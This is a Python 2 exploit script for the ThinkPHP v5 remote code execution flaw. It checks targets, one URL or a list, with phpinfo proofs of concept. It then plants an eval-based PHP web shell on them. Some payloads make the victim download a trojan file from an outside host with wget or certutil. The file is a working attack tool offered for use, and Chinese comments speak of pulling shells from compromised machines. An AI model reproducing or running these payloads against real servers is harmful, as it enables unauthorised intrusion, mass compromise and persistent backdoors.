# -*-coding:UTF-8 -*-
import requests
import random
import re
import getopt
import sys


poc_post = {
    "_method":"__construct",
    "filter[]":"phpinfo",
    "method":"get",
    "server[REQUEST_METHOD]":"1"
}
poc_0 = r"index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
poc_1 = r"index/\think\Request/input&filter=phpinfo&data=1"
poc_2 = r"index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
poc_3 = r"[module]/think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
poc = [poc_0,poc_1,poc_2,poc_3]

exp_post_0 = {
    "_method":"__construct",
    "filter[]":"system",
    "method":"get",
    "server[REQUEST_METHOD]":"echo ^<?php @eval($_POST['xxxxx']);var_dump('xxxxx');?^> > xxxxx.php"
}
exp_post_1 = {
    "_method":"__construct",
    "filter[]":"file_put_contents",
    "method":"get",
    "server[get]":"<?php @eval($_POST['xxxxx']);var_dump('xxxxx');?>"
}
exp_post = [exp_post_0, exp_post_1]
# 其实写shell太难，能执行命令了不如直接从肉鸡上下载一个shell文件下来更快
exp_0 = r'index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php @eval($_POST["xxxxx"]);echo "xxxxx";?^> > xxxxx.php'
exp_1 = r'index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=xxxxx.php&vars[1][]=<?php @eval($_POST["xxxxx"]);echo "xxxxx";?>'
exp_2 = r'index/\think\Request/input&filter=system&data=echo ^<?php @eval($_POST["xxxxx"]);echo "xxxxx";?^> > xxxxx.php'
exp_3 = r'index/\think\template\driver\file/write&cacheFile=xxxxx.php&content=echo ^<?php @eval($_POST["xxxxx"]);echo "xxxxx";?^> > xxxxx.php'
exp_4 = r'index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=certutil -urlcache -split -f https://raw.githubusercontent.com/mntn0x/POC/master/thinkphpV5-rce/muma.php'
exp_5 = r'index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=wget https://raw.githubusercontent.com/mntn0x/POC/master/thinkphpV5-rce/muma.php'
exp_6 = r'[module]/think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=wget https://raw.githubusercontent.com/mntn0x/POC/master/thinkphpV5-rce/muma.php'
exp = [exp_0,exp_1,exp_2,exp_3,exp_4,exp_5,exp_6]

User_Agent = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
    "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11"
]

results = {}
url = ""
timeout = 20
file = ""


def get_system(req):
    reg = r'<td class="e">System </td><td class="v">(.*?)<'
    try:
        reg_text = re.compile(reg, re.S)
        system = reg_text.findall(req.text)
        print "[+] System: " + system[0]
        return str(system[0])
    except IndexError:
        reg = r'<td class="e">System </td><td class="v">(.*?) '
        system = reg_text.findall(req.text)
        print "[+] System: " + system[0]
        return str(system[0])

def poc_check(url, timeout=20):
    print "* Try POST POC * "+url+"catpcha"
    try:
        req = requests.post(url+"captcha", headers={"User-Agent": User_Agent[random.randint(0,1)]}, timeout=timeout, data=poc_post)
        if "PHP Version" in req.text:
            print "[+] phpinfo successful !"
            print "[+] poc is: _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"
            systeminfo = get_system(req)
            # 如果成功验证了poc，就将url和poc一起放入结果字典
            results[url] = "POC: _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1 <===> "+systeminfo
            return 0
    except requests.exceptions.Timeout:
        print "Timeout. phpinfo checked fail"
        pass
    except requests.exceptions.ConnectionError:
        print "Connection Error"

    for i in range(0,len(poc)):
        print "* Try POC "+str(i)+" *"
        try:
            req = requests.get(url+poc[i], headers={"User-Agent": User_Agent[random.randint(0,1)]}, timeout=timeout)
            if "PHP Version" in req.text:
                print "[+] phpinfo successful !"
                print "[+] POC is: " + url + poc[i]
                systeminfo=get_system(req)
                results[url] = poc[i]+" <===> "+systeminfo
                return 0

        except requests.exceptions.Timeout:
            print "Timeout. phpinfo checked fail"
        except requests.exceptions.ConnectionError:
            print "Connection Error"
    return 1


def shell_check(shell_url, exp):
    try:
        req = requests.get(shell_url, headers={"User-Agent": User_Agent[random.randint(0, 1)]})
        if req.status_code != 200:
            print "write failed. status_code "+str(req.status_code)
            return 0

        elif "xxxxx" in req.text:
            print "[+] shell write successful ! "
            print "[+] EXP is:" + str(exp)
            print "[+] "+shell_url
            return 1
    except requests.exceptions.Timeout:
        print "Timeout. shell checked fail"
    except requests.exceptions.ConnectionError:
        print "Connection Error."


def write_shell(url, timeout=20):
    shell_url = url.split("index.php")[0]+"xxxxx.php"
    print "* Try POST EXP * "+url+"catpcha"
    try:
        for i in range(0,len(exp_post)):
            req = requests.post(url + "captcha", headers={"User-Agent": User_Agent[random.randint(0, 1)]},timeout=timeout, data=exp_post[i])
            check_status = shell_check(shell_url, exp_post[i])
            if check_status:
                # 如果写shell成功，就将该url对应的value改为shell的路径加exp
                results[url] = shell_url + " <===> " + str(exp_post[i])
                return
    except requests.exceptions.Timeout:
        print "Timeout"
    except requests.exceptions.ConnectionError:
        print "Connection Error"+str(req.status_code)

    for i in range(0, len(exp)):
        print "* Try exp "+ str(i) +" *"
        try:
            req = requests.get(url+exp[i], headers={"User-Agent": User_Agent[random.randint(0,1)]}, timeout=timeout)
        except requests.exceptions.Timeout:
            print "Timeout"
        except requests.exceptions.ConnectionError:
            print "Connection Error" + str(req.status_codes)
        check_status=shell_check(shell_url, exp[i])
        if check_status:
            results[url] = shell_url + " <===> " + exp[i]
            return
    print "[-] No shell write in. Please try rce manually or download the Trojan directly from VPS"


def main():
    global url
    global timeout
    global file
    singel = False
    helpinfo = """
            *****************************************************************************
            1. single url : python2 thinkphpV5-rce.py -u "http://vuln.com/index.php?s="
            2. urls file : python2 thikphpV5-rce.py -f "filepath"
            default timeout is 20s, you can use -t to set time : -t 10
            *****************************************************************************
        """
    # 如果没有输入参数,抛出使用说明
    if not len(sys.argv[1:]):
        print helpinfo
        return 0
    try:
        opts, args = getopt.getopt(sys.argv[1:], "t:u:f:",
                                    ["url","file","timeout"])
    except getopt.GetoptError as err:
        print(str(err))
        print helpinfo
    for o,a in opts:
        if o in ("-u", "--url"):
            url = a
            singel = True
        elif o in ("-f", "--file"):
            file = a
        if o in ("-t", "--timeout"):
            timeout = int(a)
    if singel:
        target_url = url
        print target_url
        status = poc_check(target_url, timeout)
        if status:
            print "rce falied. No satisfied poc"
        else:
            write_shell(target_url, timeout)
    else:
        with open(file, "r") as f:
            urls = f.readlines()
        for url in urls:
            print "-----------------------------------------"
            target_url = "http://"+url.split("\r\n")[0] + "/index.php?s="
            print target_url
            status = poc_check(target_url, timeout)
            if status:
                print "rce falied. No satisfied poc"
            else:
                write_shell(target_url, timeout)

    for item in results:
        print "*********************************************************************\n"*2
        print "Url: "+item.split("index.php")[0]
        print "poc/exp url: "+results[item].split("<===>")[0]
        print "poc/exp: "+results[item].split("<===>")[1]

if __name__ == '__main__':
    main()

# 5.1版本代码执行poc没有加
